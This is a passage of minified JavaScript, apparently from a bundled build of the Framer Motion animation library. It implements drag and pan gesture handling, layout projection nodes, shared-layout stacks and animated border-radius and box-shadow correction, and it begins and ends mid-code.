a||this.visualElement.getValue(e,(s.initial?s.initial[e]:void 0)||0)}snapToCursor(e){Nt(r=>{const{drag:s}=this.getProps();if(!Go(r,s,this.currentDirection))return;const{projection:a}=this.visualElement,l=this.getAxisMotionValue(r);if(a&&a.layout){const{min:c,max:d}=a.layout.layoutBox[r];l.set(e[r]-Ne(c,d,.5))}})}scalePositionWithinConstraints(){if(!this.visualElement.current)return;const{drag:e,dragConstraints:r}=this.getProps(),{projection:s}=this.visualElement;if(!di(r)||!s||!this.constraints)return;this.stopAnimation();const a={x:0,y:0};Nt(c=>{const d=this.getAxisMotionValue(c);if(d){const p=d.get();a[c]=c1({min:p,max:p},this.constraints[c])}});const{transformTemplate:l}=this.visualElement.getProps();this.visualElement.current.style.transform=l?l({},""):"none",s.root&&s.root.updateScroll(),s.updateLayout(),this.resolveConstraints(),Nt(c=>{if(!Go(c,e,null))return;const d=this.getAxisMotionValue(c),{min:p,max:f}=this.constraints[c];d.set(Ne(p,f,a[c]))})}addListeners(){if(!this.visualElement.current)return;b1.set(this.visualElement,this);const e=this.visualElement.current,r=gn(e,"pointerdown",p=>{const{drag:f,dragListener:m=!0}=this.getProps();f&&m&&this.start(p)}),s=()=>{const{dragConstraints:p}=this.getProps();di(p)&&(this.constraints=this.resolveRefConstraints())},{projection:a}=this.visualElement,l=a.addEventListener("measure",s);a&&!a.layout&&(a.root&&a.root.updateScroll(),a.updateLayout()),s();const c=pn(window,"resize",()=>this.scalePositionWithinConstraints()),d=a.addEventListener("didUpdate",(({delta:p,hasLayoutChanged:f})=>{this.isDragging&&f&&(Nt(m=>{const y=this.getAxisMotionValue(m);y&&(this.originPoint[m]+=p[m].translate,y.set(y.get()+p[m].translate))}),this.visualElement.render())}));return()=>{c(),r(),l(),d&&d()}}getProps(){const e=this.visualElement.getProps(),{drag:r=!1,dragDirectionLock:s=!1,dragPropagation:a=!1,dragConstraints:l=!1,dragElastic:c=du,dragMomentum:d=!0}=e;return{...e,drag:r,dragDirectionLock:s,dragPropagation:a,dragConstraints:l,dragElastic:c,dragMomentum:d}}}function Go(n,e,r){return(e===!0||e===n)&&(r===null||r===n)}function w1(n,e=10){let r=null;return Math.abs(n.y)>e?r="y":Math.abs(n.x)>e&&(r="x"),r}class k1 extends qn{constructor(e){super(e),this.removeGroupControls=Ve,this.removeListeners=Ve,this.controls=new v1(e)}mount(){const{dragControls:e}=this.node.getProps();e&&(this.removeGroupControls=e.subscribe(this.controls)),this.removeListeners=this.controls.addListeners()||Ve}unmount(){this.removeGroupControls(),this.removeListeners()}}const Jf=n=>(e,r)=>{n&&Ie.update(()=>n(e,r))};class x1 extends qn{constructor(){super(...arguments),this.removePointerDownListener=Ve}onPointerDown(e){this.session=new hy(e,this.createPanHandlers(),{transformPagePoint:this.node.getTransformPagePoint(),contextWindow:by(this.node)})}createPanHandlers(){const{onPanSessionStart:e,onPanStart:r,onPan:s,onPanEnd:a}=this.node.getProps();return{onSessionStart:Jf(e),onStart:Jf(r),onMove:s,onEnd:(l,c)=>{delete this.session,a&&Ie.update(()=>a(l,c))}}}mount(){this.removePointerDownListener=gn(this.node.current,"pointerdown",e=>this.onPointerDown(e))}update(){this.session&&this.session.updateHandlers(this.createPanHandlers())}unmount(){this.removePointerDownListener(),this.session&&this.session.end()}}function S1(){const n=C.useContext(xa);if(n===null)return[!0,null];const{isPresent:e,onExitComplete:r,register:s}=n,a=C.useId();return C.useEffect(()=>s(a),[]),!e&&r?[!1,()=>r&&r(a)]:[!0]}const na={hasAnimatedSinceResize:!0,hasEverUpdated:!1};function Qf(n,e){return e.max===e.min?0:n/(e.max-e.min)*100}const as={correct:(n,e)=>{if(!e.target)return n;if(typeof n=="string")if(ce.test(n))n=parseFloat(n);else return n;const r=Qf(n,e.target.x),s=Qf(n,e.target.y);return`${r}% ${s}%`}},T1={correct:(n,{treeScale:e,projectionDelta:r})=>{const s=n,a=Hn.parse(n);if(a.length>5)return s;const l=Hn.createTransformer(n),c=typeof a[0]!="number"?1:0,d=r.x.scale*e.x,p=r.y.scale*e.y;a[0+c]/=d,a[1+c]/=p;const f=Ne(d,p,.5);return typeof a[2+c]=="number"&&(a[2+c]/=f),typeof a[3+c]=="number"&&(a[3+c]/=f),l(a)}};class A1 extends Ee.Component{componentDidMount(){const{visualElement:e,layoutGroup:r,switchLayoutGroup:s,layoutId:a}=this.props,{projection:l}=e;D0(C1),l&&(r.group&&r.group.add(l),s&&s.register&&a&&s.register(l),l.root.didUpdate(),l.addEventListener("animationComplete",()=>{this.safeToRemove()}),l.setOptions({...l.options,onExitComplete:()=>this.safeToRemove()})),na.hasEverUpdated=!0}getSnapshotBeforeUpdate(e){const{layoutDependency:r,visualElement:s,drag:a,isPresent:l}=this.props,c=s.projection;return c&&(c.isPresent=l,a||e.layoutDependency!==r||r===void 0?c.willUpdate():this.safeToRemove(),e.isPresent!==l&&(l?c.promote():c.relegate()||Ie.postRender(()=>{const d=c.getStack();(!d||!d.members.length)&&this.safeToRemove()}))),null}componentDidUpdate(){const{projection:e}=this.props.visualElement;e&&(e.root.didUpdate(),queueMicrotask(()=>{!e.currentAnimation&&e.isLead()&&this.safeToRemove()}))}componentWillUnmount(){const{visualElement:e,layoutGroup:r,switchLayoutGroup:s}=this.props,{projection:a}=e;a&&(a.scheduleCheckAfterUnmount(),r&&r.group&&r.group.remove(a),s&&s.deregister&&s.deregister(a))}safeToRemove(){const{safeToRemove:e}=this.props;e&&e()}render(){return null}}function vy(n){const[e,r]=S1(),s=C.useContext(Lu);return Ee.createElement(A1,{...n,layoutGroup:s,switchLayoutGroup:C.useContext(fm),isPresent:e,safeToRemove:r})}const C1={borderRadius:{...as,applyTo:["borderTopLeftRadius","borderTopRightRadius","borderBottomLeftRadius","borderBottomRightRadius"]},borderTopLeftRadius:as,borderTopRightRadius:as,borderBottomLeftRadius:as,borderBottomRightRadius:as,boxShadow:T1},wy=["TopLeft","TopRight","BottomLeft","BottomRight"],E1=wy.length,Yf=n=>typeof n=="string"?parseFloat(n):n,Xf=n=>typeof n=="number"||ce.test(n);function P1(n,e,r,s,a,l){a?(n.opacity=Ne(0,r.opacity!==void 0?r.opacity:1,_1(s)),n.opacityExit=Ne(e.opacity!==void 0?e.opacity:1,0,I1(s))):l&&(n.opacity=Ne(e.opacity!==void 0?e.opacity:1,r.opacity!==void 0?r.opacity:1,s));for(let c=0;c<E1;c++){const d=`border${wy[c]}Radius`;let p=Zf(e,d),f=Zf(r,d);if(p===void 0&&f===void 0)continue;p||(p=0),f||(f=0),p===0||f===0||Xf(p)===Xf(f)?(n[d]=Math.max(Ne(Yf(p),Yf(f),s),0),(tn.test(f)||tn.test(p))&&(n[d]+="%")):n[d]=f}(e.rotate||r.rotate)&&(n.rotate=Ne(e.rotate||0,r.rotate||0,s))}function Zf(n,e){return n[e]!==void 0?n[e]:n.borderRadius}const _1=ky(0,.5,Wm),I1=ky(.5,.95,Ve);function ky(n,e,r){return s=>s<n?0:s>e?1:r(xs(n,e,s))}function eg(n,e){n.min=e.min,n.max=e.max}function Bt(n,e){eg(n.x,e.x),eg(n.y,e.y)}function tg(n,e,r,s,a){return n-=e,n=pa(n,1/r,s),a!==void 0&&(n=pa(n,1/a,s)),n}function R1(n,e=0,r=1,s=.5,a,l=n,c=n){if(tn.test(e)&&(e=parseFloat(e),e=Ne(c.min,c.max,e/100)-c.min),typeof e!="number")return;let d=Ne(l.min,l.max,s);n===l&&(d-=e),n.min=tg(n.min,e,r,d,a),n.max=tg(n.max,e,r,d,a)}function ng(n,e,[r,s,a],l,c){R1(n,e[r],e[s],e[a],e.scale,l,c)}const D1=["x","scaleX","originX"],O1=["y","scaleY","originY"];function rg(n,e,r,s){ng(n.x,e,D1,r?r.x:void 0,s?s.x:void 0),ng(n.y,e,O1,r?r.y:void 0,s?s.y:void 0)}function ig(n){return n.translate===0&&n.scale===1}function xy(n){return ig(n.x)&&ig(n.y)}function j1(n,e){return n.x.min===e.x.min&&n.x.max===e.x.max&&n.y.min===e.y.min&&n.y.max===e.y.max}function Sy(n,e){return Math.round(n.x.min)===Math.round(e.x.min)&&Math.round(n.x.max)===Math.round(e.x.max)&&Math.round(n.y.min)===Math.round(e.y.min)&&Math.round(n.y.max)===Math.round(e.y.max)}function sg(n){return Pt(n.x)/Pt(n.y)}class M1{constructor(){this.members=[]}add(e){Zu(this.members,e),e.scheduleRender()}remove(e){if(ed(this.members,e),e===this.prevLead&&(this.prevLead=void 0),e===this.lead){const r=this.members[this.members.length-1];r&&this.promote(r)}}relegate(e){const r=this.members.findIndex(a=>e===a);if(r===0)return!1;let s;for(let a=r;a>=0;a--){const l=this.members[a];if(l.isPresent!==!1){s=l;break}}return s?(this.promote(s),!0):!1}promote(e,r){const s=this.lead;if(e!==s&&(this.prevLead=s,this.lead=e,e.show(),s)){s.instance&&s.scheduleRender(),e.scheduleRender(),e.resumeFrom=s,r&&(e.resumeFrom.preserveOpacity=!0),s.snapshot&&(e.snapshot=s.snapshot,e.snapshot.latestValues=s.animationValues||s.latestValues),e.root&&e.root.isUpdating&&(e.isLayoutDirty=!0);const{crossfade:a}=e.options;a===!1&&s.hide()}}exitAnimationComplete(){this.members.forEach(e=>{const{options:r,resumingFrom:s}=e;r.onExitComplete&&r.onExitComplete(),s&&s.options.onExitComplete&&s.options.onExitComplete()})}scheduleRender(){this.members.forEach(e=>{e.instance&&e.scheduleRender(!1)})}removeLeadSnapshot(){this.lead&&this.lead.snapshot&&(this.lead.snapshot=void 0)}}function og(n,e,r){let s="";const a=n.x.translate/e.x,l=n.y.translate/e.y;if((a||l)&&(s=`translate3d(${a}px, ${l}px, 0) `),(e.x!==1||e.y!==1)&&(s+=`scale(${1/e.x}, ${1/e.y}) `),r){const{rotate:p,rotateX:f,rotateY:m}=r;p&&(s+=`rotate(${p}deg) `),f&&(s+=`rotateX(${f}deg) `),m&&(s+=`rotateY(${m}deg) `)}const c=n.x.scale*e.x,d=n.y.scale*e.y;return(c!==1||d!==1)&&(s+=`scale(${c}, ${d})`),s||"none"}const B1=(n,e)=>n.depth-e.depth;class N1{constructor(){this.children=[],this.isDirty=!1}add(e){Zu(this.children,e),this.isDirty=!0}remove(e){ed(this.children,e),this.isDirty=!0}forEach(e){this.isDirty&&this.children.sort(B1),this.isDirty=!1,this.children.forEach(e)}}function L1(n,e){const r=performance.now(),s=({timestamp:a})=>{const l=a-r;l>=e&&(yn(s),n(l-e))};return Ie.read(s,!0),()=>yn(s)}function F1(n){window.MotionDebug&&window.MotionDebug.record(n)}function U1(n){return n instanceof SVGElement&&n.tagName!=="svg"}function z1(n,e,r){const s=wt(n)?n:mi(n);return s.start(Xu("",s,e,r)),s.animation}const ag=["","X","Y","Z"],V1={visibility:"hidden"},lg=1e3;let W1=0;const hr={type:"projectionFrame",totalNodes:0,resolvedTargetDeltas:0,recalculatedProjection:0};function Ty({attachResizeListener:n,defaultParent:e,measureScroll:r,checkIsScrollRoot:s,resetTransform:a}){return class{constructor(c={},d=e?.()){this.id=W1++,this.animationId=0,this.children=new Set,this.options={},this.isTreeAnimating=!1,this.isAnimationBlocked=!1,this.isLayoutDirty=!1,this.isProjectionDirty=!1,this.isSharedProjectionDirty=!1,this.isTransformDirty=!1,this.updateManuallyBlocked=!1,this.updateBlockedByResize=!1,this.isUpdating=!1,this.isSVG=!1,this.needsReset=!1,this.shouldResetTransform=!1,this.treeScale={x:1,y:1},this.eventHandlers=new Map,this.hasTreeAnimated=!1,this.updateScheduled=!1,this.projectionUpdateScheduled=!1,this.checkUpdateFailed=()=>{this.isUpdating&&(this.isUpdating=!1,this.clearAllSnapshots())},this.updateProjection=()=>{this.projectionUpdateScheduled=!1,hr.totalNodes=hr.resolvedTargetDeltas=hr.recalculatedProjection=0,this.nodes.forEach(q1),this.nodes.forEach(Y1),this.nodes.forEach(X1),this.nodes.forEach(G1),F1(hr)},this.hasProjected=!1,this.isVisible=!0,this.animationProgress=0,this.sharedNodes=new Map,this.latestValues=c,this.root=d?d.root||d:this,this.path=d?[...d.path,d]:[],this.parent=d,this.depth=d?d.depth+1:0;for(let p=0;p<this.path.length;p++)this.path[p].shouldResetTransform=!0;this.root===this&&(this.nodes=new N1)}addEventListener(c,d){return this.eventHandlers.has(c)||this.eventHandlers.set(c,new td),this.eventHandlers.get(c).add(d)}notifyListeners(c,...d){const p=this.eventHandlers.get(c);p&&p.notify(...d)}hasListeners(c){return this.eventHandlers.has(c)}mount(c,d=this.root.hasTreeAnimated){if(this.instance)return;this.isSVG=U1(c),this.instance=c;const{layoutId:p,layout:f,visualElement:m}=this.options;if(m&&!m.current&&m.mount(c),this.root.nodes.add(this),this.parent&&this.parent.children.add(this),d&&(f||p)&&(this.isLayoutDirty=!0),n){let y;const v=()=>this.root.updateBlockedByResize=!1;n(c,()=>{this.root.updateBlockedByResize=!0,y&&y(),y=L1(v,250),na.hasAnimatedSinceResize&&(na.hasAnimatedSinceResize=!1,this.nodes.forEach(ug))})}p&&this.root.registerSharedNode(p,this),this.options.animate!==!1&&m&&(p||f)&&this.addEventListener("didUpdate",({delta:y,hasLayoutChanged:v,hasRelativeTargetChanged:w,layout:A})=>{if(this.isTreeAnimationBlocked()){this.target=void 0,this.relativeTarget=void 0;return}const k=this.options.transition||m.getDefaultTransition()||r2,{onLayoutAnimationStart:x,onLayoutAnimationComplete:B}=m.getProps(),_=!this.targetLayout||!Sy(this.targetLayout,A)||w,P=!v&&w;if(this.options.layoutRoot||this.resumeFrom&&this.resumeFrom.instance||P||v&&(_||!this.currentAnimation)){this.resumeFrom&&(this.resumingFrom=this.resumeFrom,this.resumingFrom.resumingFrom=void 0),this.setAnimationOrigin(y,P);const M={...Yu(k,"layout"),onPlay:x,onComplete:B};(m.shouldReduceMotion||this.options.layoutRoot)&&(M.delay=0,M.type=!1),this.startAnimation(M)}else v||ug(this),this.isLead()&&this.options.onExitComplete&&this.options.onExitComplete();this.targetLayout=A})}unmount(){this.options.layoutId&&this.willUpdate(),this.root.nodes.remove(this);const c=this.getStack();c&&c.remove(this),this.parent&&this.parent.children.delete(this),this.instance=void 0,yn(this.updateProjection)}blockUpdate(){this.updateManuallyBlocked=!0}unblockUpdate(){this.updateManuallyBlocked=!1}isUpdateBlocked(){return this.updateManuallyBlocked||this.updateBlockedByResize}isTreeAnimationBlocked(){return this.isAnimationBlocked||this.parent&&this.parent.isTreeAnimationBlocked()||!1}startUpdate(){this.isUpdateBlocked()||(this.isUpdating=!0,this.nodes&&this.nodes.forEach(Z1),this.animationId++)}getTransformTemplate(){const{visualElement:c}=this.options;return c&&c.getProps().transformTemplate}willUpdate(c=!0){if(this.root.hasTreeAnimated=!0,this.root.isUpdateBlocked()){this.options.onExitComplete&&this.options.onExitComplete();return}if(!this.root.isUpdating&&this.root.startUpdate(),this.isLayoutDirty)return;this.isLayoutDirty=!0;for(let m=0;m<this.path.length;m++){const y=this.path[m];y.shouldResetTransform=!0,y.updateScroll("snapshot"),y.options.layoutRoot&&y.willUpdate(!1)}const{layoutId:d,layout:p}=this.options;if(d===void 0&&!p)return;const f=this.getTransformTemplate();this.prevTransformTemplateValue=f?f(this.latestValues,""):void 0,this.updateSnapshot(),c&&this.notifyListeners("willUpdate")}update(){if(this.updateScheduled=!1,this.isUpdateBlocked()){this.unblockUpdate(),this.clearAllSnapshots(),this.nodes.forEach(cg);return}this.isUpdating||this.nodes.forEach(J1),this.isUpdating=!1,this.nodes.forEach(Q1),this.nodes.forEach($1),this.nodes.forEach(H1),this.clearAllSnapshots();const d=performance.now();ct.delta=$n(0,1e3/60,d-ct.timestamp),ct.timestamp=d,ct.isProcessing=!0,Rc.update.process(ct),Rc.preRender.process(ct),Rc.render.process(ct),ct.isProcessing=!1}didUpdate(){this.updateScheduled||(this.updateScheduled=!0,queueMicrotask(()=>this.update()))}clearAllSnapshots(){this.nodes.forEach(K1),this.sharedNodes.forEach(e2)}scheduleUpdateProjection(){this.projectionUpdateScheduled||(this.projectionUpdateScheduled=!0,Ie.preRender(this.updateProjection,!1,!0))}scheduleCheckAfterUnmount(){Ie.postRender(()=>{this.isLayoutDirty?this.root.didUpdate():this.root.checkUpdateFailed()})}updateSnapshot(){this.snapshot||!this.instance||(this.snapshot=this.measure())}updateLayout(){if(!this.instance||(this.updateScroll(),!(this.options.alwaysMeasureLayout&&this.isLead())&&!this.isLayoutDirty))return;if(this.resumeFrom&&!this.resumeFrom.instance)for(let p=0;p<this.path.length;p++)this.path[p].updateScroll();const c=this.layout;this.layout=this.measure(!1),this.layoutCorrected=$e(),this.isLayoutDirty=!1,this.projectionDelta=void 0,this.notifyListeners("measure",this.layout.layoutBox);const{visualElement:d}=this.options;d&&d.notify("LayoutMeasure",this.layout.layoutBox,c?c.layoutBox:void 0)}updateScroll(c="measure"){let d=!!(this.options.layoutScroll&&this.instance);this.scroll&&this.scroll.animationId===this.root.animationId&&this.scroll.phase===c&&(d=!1),d&&(this.scroll={animationId:this.root.animationId,phase:c,isRoot:s(this.instance),offset:r(this.instance)})}resetTransform(){if(!a)return;const c=this.isLayoutDirty||this.shouldResetTransform,d=this.projectionDelta&&!xy(this.projectionDelta),p=this.getTransformTemplate(),f=p?p(this.latestValues,""):void 0,m=f!==this.prevTransformTemplateValue;c&&(d||dr(this.latestValues)||m)&&(a(this.instance,f),this.shouldResetTransform=!1,this.scheduleRender())}measure(c=!0){const d=this.measurePageBox();let p=this.removeElementScroll(d);return c&&(p=this.removeTransform(p)),i2(p),{animationId:this.root.animationId,measuredBox:d,layoutBox:p,latestValues:{},source:this.id}}measurePageBox(){const{visualElement:c}=this.options;if(!c)return $e();const d=c.measureViewportBox(),{scroll:p}=this.root;return p&&(zn(d.x,p.offset.x),zn(d.y,p.offset.y)),d}removeElementScroll(c){const d=$e();Bt(d,c);for(let p=0;p<this.path.length;p++){const f=this.path[p],{scroll:m,options:y}=f;if(f!==this.root&&m&&y.layoutScroll){if(m.isRoot){Bt(d,c);const{scroll:v}=this.root;v&&(zn(d.x,-v.offset.x),zn(d.y,-v.offset.y))}zn(d.x,m.offset.x),zn(d.y,m.offset.y)}}return d}applyTransform(c,d=!1){const p=$e();Bt(p,c);for(let f=0;f<this.path.length;f++){const m=this.path[f];!d&&m.options.layoutScroll&&m.scroll&&m!==m.root&&fi(p,{x:-m.scroll.offset.x,y:-m.scroll.offset.y}),dr(m.latestValues)&&fi(p,m.latestValues)}return dr(this.latestValues)&&fi(p,this.latestValues),p}removeTransform(c){const d=$e();Bt(d,c);for(let p=0;p<this.path.length;p++){const f=this.path[p];if(!f.instance||!dr(f.latestValues))continue;hu(f.latestValues)&&f.updateSnapshot();const m=$e(),y=f.measurePageBox();Bt(m,y),rg(d,f.latestValues,f.snapshot?f.snapshot.layoutBox:void 0,m)}return dr(this.latestValues)&&rg(d,this.latestValues),d}setTargetDelta(c){this.targetDelta=c,this.root.scheduleUpdateProjection(),this.isProjectionDirty=!0}setOptions(c){this.options={...this.options,...c,crossfade:c.crossfade!==void 0?c.crossfade:!0}}clearMeasurements(){this.scroll=void 0,this.layout=void 0,this.snapshot=void 0,this.prevTransformTemplateValue=void 0,this.targetDelta=void 0,this.target=void 0,this.isLayoutDirty=!1}forceRelativeParentToResolveTarget(){this.relativeParent&&this.relativeParent.resolvedRelativeTargetAt!==ct.timestamp&&this.relativeParent.resolveTargetDelta(!0)}resolveTargetDelta(c=!1){var d;const p=this.getLead();this.isProjectionDirty||(this.isProjectionDirty=p.isProjectionDirty),this.isTransformDirty||(this.isTransformDirty=p.isTransformDirty),this.isSharedProjectionDirty||(this.isSharedProjectionDirty=p.isSharedProjectionDirty);const f=!!this.resumingFrom||this!==p;if(!(c||f&&this.isSharedProjectionDirty||this.isProjectionDirty||!((d=this.parent)===null||d===void 0)&&d.isProjectionDirty||this.attemptToResolveRelativeTarget))return;const{layout:y,layoutId:v}=this.options;if(!(!this.layout||!(y||v))){if(this.resolvedRelativeTargetAt=ct.timestamp,!this.targetDelta&&!this.relativeTarget){const w=this.getClosestProjectingParent();w&&w.layout&&this.animationProgress!==1?(this.relativeParent=w,this.forceRelativeParentToResolveTarget(),this.relativeTarget=$e(),this.relativeTargetOrigin=$e(),gs(this.relativeTargetOrigin,this.layout.layoutBox,w.layout.layoutBox),Bt(this.relativeTarget,this.relativeTargetOrigin)):this.relativeParent=this.relativeTarget=void 0}if(!(!this.relativeTarget&&!this.targetDelta)){if(this.target||(this.target=$e(),this.targetWithTransforms=$e()),this.relativeTarget&&this.relativeTargetOrigin&&this.relativeParent&&this.relativeParent.target?(this.forceRelativeParentToResolveTarget(),s1(this.target,this.relativeTarget,this.relativeParent.target)):this.targetDelta?(this.resumingFrom?this.target=this.applyTransform(this.layout.layoutBox):Bt(this.target,this.layout.layoutBox),my(this.target,this.targetDelta)):Bt(this.target,this.layout.layoutBox),this.attemptToResolveRelativeTarget){this.attemptToResolveRelativeTarget=!1;const w=this.getClosestProjectingParent();w&&!!w.resumingFrom==!!this.resumingFrom&&!w.options.layoutScroll&&w.target&&this.animationProgress!==1?(this.relativeParent=w,this.forceRelativeParentToResolveTarget(),this.relativeTarget=$e(),this.relativeTargetOrigin=$e(),gs(this.relativeTargetOrigin,this.target,w.target),Bt(this.relativeTarget,this.relativeTargetOrigin)):this.relativeParent=this.relativeTarget=void 0}hr.resolvedTargetDeltas++}}}getClosestProjectingParent(){if(!(!this.parent||hu(this.parent.latestValues)||gy(this.parent.latestValues)))return this.parent.isProjecting()?this.parent:this.parent.getClosestProjectingParent()}isProjecting(){return!!((this.relativeTarget||this.targetDelta||this.options.layoutRoot)&&this.layout)}calcProjection(){var c;const d=this.getLead(),p=!!this.resumingFrom||this!==d;let f=!0;if((this.isProjectionDirty||!((c=this.parent)===null||c===void 0)&&c.isProjectionDirty)&&(f=!1),p&&(this.isSharedProjectionDirty||this.isTransformDirty)&&(f=!1),this.resolvedRelativeTargetAt===ct.timestamp&&(f=!1),f)return;const{layout:m,layoutId:y}=this.options;if(this.isTreeAnimating=!!(this.parent&&this.parent.isTreeAnimating||this.currentAnimation||this.pendingAnimation),this.isTreeAnimating||(this.targetDelta=this.relativeTarget=void 0),!this.layout||!(m||y))return;Bt(this.layoutCorrected,this.layout.layoutBox);const v=this.treeScale.x,w=this.treeScale.y;f1(this.layoutCorrected,this.treeScale,this.path,p),d.layout&&!d.target&&(this.treeScale.x!==1||this.treeScale.y!==1)&&(d.target=d.layout.layoutBox);const{target:A}=d;if(!A){this.projectionTransform&&(this.projectionDelta=pi(),this.projectionTransform="none",this.scheduleRender());return}this.projectionDelta||(this.projectionDelta=pi(),this.projectionDeltaWithTransform=pi());const k=this.projectionTransform;fs(this.projectionDelta,this.layoutCorrected,A,this.latestValues),this.projectionTransform=og(this.projectionDelta,this.treeScale),(this.projectionTransform!==k||this.treeScale.x!==v||this.treeScale.y!==w)&&(this.hasProjected=!0,this.scheduleRender(),this.notifyListeners("projectionUpdate",A)),hr.recalculatedProjection++}hide(){this.isVisible=!1}show(){this.isVisible=!0}scheduleRender(c=!0){if(this.options.scheduleRender&&this.options.scheduleRender(),c){const d=this.getStack();d&&d.scheduleRender()}this.resumingFrom&&!this.resumingFrom.instance&&(this.resumingFrom=void 0)}setAnimationOrigin(c,d=!1){const p=this.snapshot,f=p?p.latestValues:{},m={...this.latestValues},y=pi();(!this.relativeParent||!this.relativeParent.options.layoutRoot)&&(this.relativeTarget=this.relativeTargetOrigin=void 0),this.attemptToResolveRelativeTarget=!d;const v=$e(),w=p?p.source:void 0,A=this.layout?this.layout.source:void 0,k=w!==A,x=this.getStack(),B=!x||x.members.length<=1,_=!!(k&&!B&&this.options.crossfade===!0&&!this.path.some(n2));this.animationProgress=0;let P;this.mixTargetDelta=M=>{const V=M/1e3;dg(y.x,c.x,V),dg(y.y,c.y,V),this.setTargetDelta(y),this.relativeTarget&&this.relativeTargetOrigin&&this.layout&&this.relativeParent&&this.relativeParent.layout&&(gs(v,this.layout.layoutBox,this.relativeParent.layout.layoutBox),t2(this.relativeTarget,this.relativeTargetOrigin,v,V),P&&j1(this.relativeTarget,P)&&(this.isProjectionDirty=!1),P||(P=$e()),Bt(P,this.relativeTarget)),k&&(this.animationValues=m,P1(m,f,this.latestValues,V,_,B)),this.root.scheduleUpdateProjection(),this.scheduleRender(),this.animationProgress=V},this.mixTargetDelta(this.options.layoutRoot?1e3:0)}startAnimation(c){this.notifyListeners("animationStart"),this.currentAnimation&&this.currentAnimation.stop(),this.resumingFrom&&this.resumingFrom.currentAnimation&&this.resumingFrom.currentAnimation.stop(),this.pendingAnimation&&(yn(this.pendingAnimation),this.pendingAnimation=void 0),this.pendingAnimation=Ie.update(()=>{na.hasAnimatedSinceResize=!0,this.currentAnimation=z1(0,lg,{...c,onUpdate:d=>{this.mixTargetDelta(d),c.onUpdate&&c.onUpdate(d)},onComplete:()=>{c.onComplete&&c.onComplete(),this.completeAnimation()}}),this.resumingFrom&&(this.resumingFrom.currentAnimation=this.currentAnimation),this.pendingAnimation=void 0})}completeAnimation(){this.resumingFrom&&(this.resumingFrom.currentAnimation=void 0,this.resumingFrom.preserveOpacity=void 0);const c=this.getStack();c&&c.exitAnimationComplete(),this.resumingFrom=this.currentAnimation=this.animationValues=void 0,this.notifyListeners("animationComplete")}finishAnimation(){this.currentAnimation&&(this.mixTargetDelta&&this.mixTargetDelta(lg),this.currentAnimation.stop()),this.completeAnimation()}applyTransformsToTarget(){const c=this.getLead();let{targetWithTransforms:d,target:p,layout:f,latestValues:m}=c;if(!(!d||!p||!f)){if(this!==c&&this.layout&&f&&Ay(this.options.animationType,this.layout.layoutBox,f.layoutBox)){p=this.target||$e();const y=Pt(this.layout.layoutBox.x);p.x.min=c.target.x.min,p.x.max=p.x.min+y;const v=Pt(this.layout.layoutBox.y);p.y.min=c.target.y.min,p.y.max=p.y.min+v}Bt(d,p),fi(d,m),fs(this.projectionDeltaWithTransform,this.layoutCorrected,d,m)}}registerSharedNode(c,d){this.sharedNodes.has(c)||this.sharedNodes.set(c,new M1),this.sharedNodes.get(c).add(d);const f=d.options.initialPromotionConfig;d.promote({transition:f?f.transition:void 0,preserveFollowOpacity:f&&f.shouldPreserveFollowOpacity?f.shouldPreserveFollowOpacity(d):void 0})}isLead(){const c=this.getStack();return c?c.lead===this:!0}getLead(){var c;const{layoutId:d}=this.options;return d?((c=this.getStack())===null||c===void 0?void 0:c.lead)||this:this}getPrevLead(){var c;const{layoutId:d}=this.options;return d?(c=this.getStack())===null||c===void 0?void 0:c.prevLead:void 0}getStack(){const{layoutId:c}=this.options;if(c)return this.root.sharedNodes.get(c)}promote({needsReset:c,transition:d,preserveFollowOpacity:p}={}){const f=this.getStack();f&&f.promote(this,p),c&&(this.projectionDelta=void 0,this.needsReset=!0),d&&this.setOptions({transition:d})}relegate(){const c=this.getStack();return c?c.relegate(this):!1}resetRotation(){const{visualElement:c}=this.options;if(!c)return;let d=!1;const{latestValues:p}=c;if((p.rotate||p.rotateX||p.rotateY||p.rotateZ)&&(d=!0),!d)return;const f={};for(let m=0;m<ag.length;m++){const y="rotate"+ag[m];p[y]&&(f[y]=p[y],c.setStaticValue(y,0))}c.render();for(const m in f)c.setStaticValue(m,f[m]);c.scheduleRender()}getProjectionStyles(c){var d,p;if(!this.instance||this.isSVG)return;if(!this.isVisible)return V1;const f={visibility:""},m=this.getTransformTemplate();if(this.needsReset)return this.needsReset=!1,f.opacity="",f.pointerEvents=ta(c?.pointerEvents)||"",f.transform=m?m(this.latestValues,""):"none",f;const y=this.getLead();if(!this.projectionDelta||!this.layout||!y.target){const k={};return this.options.layoutId&&(k.opacity=this.latestValues.opacity!==void 0?this.latestValues.opacity:1,k.pointerEvents=ta(c?.pointerEvents)||""),this.hasProjected&&!dr(this.latestValues)&&(k.transform=m?m({},""):"none",this.hasProjected=!1),k}const v=y.animationValues||y.latestValues;this.applyTransformsToTarget(),f.transform=og(this.projectionDeltaWithTransform,this.treeScale,v),m&&(f.transform=m(v,f.transform));const{x:w,y:A}=this.projectionDelta;f.transformOrigin=`${w.origin*100}% ${A.origin*100}% 0`,y.animationValues?f.opacity=y===this?(p=(d=v.opacity)!==null&&d!==void 0?d:this.latestValues.opacity)!==null&&p!==void 0?p:1:this.preserveOpacity?this.latestValues.opacity:v.opacityExit:f.opacity=y===this?v.opacity!==void 0?v.opacity:"":v.opacityExit!==void 0?v.opacityExit:0;for(const k in oa){if(v[k]===void 0)continue;const{correct:x,applyTo:B}=oa[k],_=f.transform==="none"?v[k]:x(v[k],y);if(B){const P=B.length;for(let M=0;M<P;M++)f[B[M]]=_}else f[k]=_}return this.options.layoutId&&(f.pointerEvents=y===this?ta(c?.pointerEvents)||"":"none"),f}clearSnapshot(){this.resumeFrom=this.snapshot=void 0}resetTree(){this.root.nodes.forEach(c=>{var d;return(d=c.currentAnimation)===null||d===void 0?void 0:d.stop()}),this.root.nodes.forEach(cg),this.root.sharedNodes.clear()}}}function $1(n){n.updateLayout()}function H1(n){var e;const r=((e=n.resumeFrom)===null||e===void 0?void 0:e.snapshot)||n.snapshot;if(n.isLead()&&n.layout&&r&&n.hasListeners("didUpdate")){const{layoutBox:s,measuredBox:a}=n.layout,{animationType:l}=n.options,c=r.source!==n.layout.source;l==="size"?Nt(y=>{const v=c?r.measuredBox[y]:r.layoutBox[y],w=Pt(v);v.min=s[y].min,v.max=v.min+w}):Ay(l,r.layoutBox,s)&&Nt(y=>{const v=c?r.measuredBox[y]:r.layoutBox[y],w=Pt(s[y]);v.max=v.min+w,n.relativeTarget&&!n.currentAnimation&&(n.isProjectionDirty=!0,n.relativeTarget[y].max=n.relativeTarget[y].min+w)});const d=pi();fs(d,s,r.layoutBox);const 